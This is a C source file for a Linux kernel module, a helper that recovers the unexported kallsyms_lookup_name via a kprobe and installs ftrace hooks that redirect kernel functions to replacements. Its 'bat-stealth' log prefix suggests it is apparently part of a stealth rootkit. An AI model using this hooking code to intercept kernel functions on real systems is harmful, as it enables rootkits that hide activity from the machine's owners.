#include <linux/module.h>
#include "ftrace_helper.h"

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
#endif

#ifdef KPROBE_LOOKUP
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
kallsyms_lookup_name_t kallsyms_lookup_name_fn = NULL;
#endif

notrace unsigned long *resolve_sym(const char *symname)
{
    if (kallsyms_lookup_name_fn == NULL) {
#ifdef KPROBE_LOOKUP
        register_kprobe(&kp);
        kallsyms_lookup_name_fn = (kallsyms_lookup_name_t) kp.addr;
        unregister_kprobe(&kp);
#else
        kallsyms_lookup_name_fn = &kallsyms_lookup_name;
#endif
    }
    return (unsigned long *)kallsyms_lookup_name_fn(symname);
}

notrace int fh_resolve_hook_address(struct ftrace_hook *hook)
{
    hook->address = (unsigned long)resolve_sym(hook->name);

    if (!hook->address) {
        pr_debug("bat-stealth: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }
#if USE_FENTRY_OFFSET
    *((unsigned long *)hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
    *((unsigned long *)hook->original) = hook->address;
#endif
    return 0;
}

void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                              struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
#if USE_FENTRY_OFFSET
    REGS_SET_PC(regs, hook->function);
#else
    if (!within_module(parent_ip, THIS_MODULE))
        REGS_SET_PC(regs, hook->function);
#endif
}

notrace int fh_install_hook(struct ftrace_hook *hook)
{
    int err = fh_resolve_hook_address(hook);
    if (err) return err;

    hook->ops.func  = (ftrace_func_t)fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS |
                      FTRACE_OPS_FL_RECURSION  |
                      FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        pr_debug("bat-stealth: ftrace_set_filter_ip() failed: %d\n", err);
        hook->address = 0; /* ops never registered   guard fh_remove_hook */
        return err;
    }
    err = register_ftrace_function(&hook->ops);
    if (err) {
        pr_debug("bat-stealth: register_ftrace_function() failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0); /* undo filter */
        hook->address = 0;
    }
    return err;
}

notrace void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;

    if (!hook->address)
        return; /* never installed or already removed */

    err = unregister_ftrace_function(&hook->ops);
    if (err)
        pr_debug("bat-stealth: unregister_ftrace_function() failed: %d\n", err);

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
        pr_debug("bat-stealth: ftrace_set_filter_ip() failed: %d\n", err);

    hook->address = 0; /* mark as removed   prevents double-unregister */
}

notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;
    int err;

    for (i = 0; i < count; i++) {
        err = fh_install_hook(&hooks[i]);
        if (err) goto error;
    }
    return 0;
error:
    while (i--)
        fh_remove_hook(&hooks[i]);
    return err;
}

notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;
    for (i = 0; i < count; i++)
        fh_remove_hook(&hooks[i]);
}
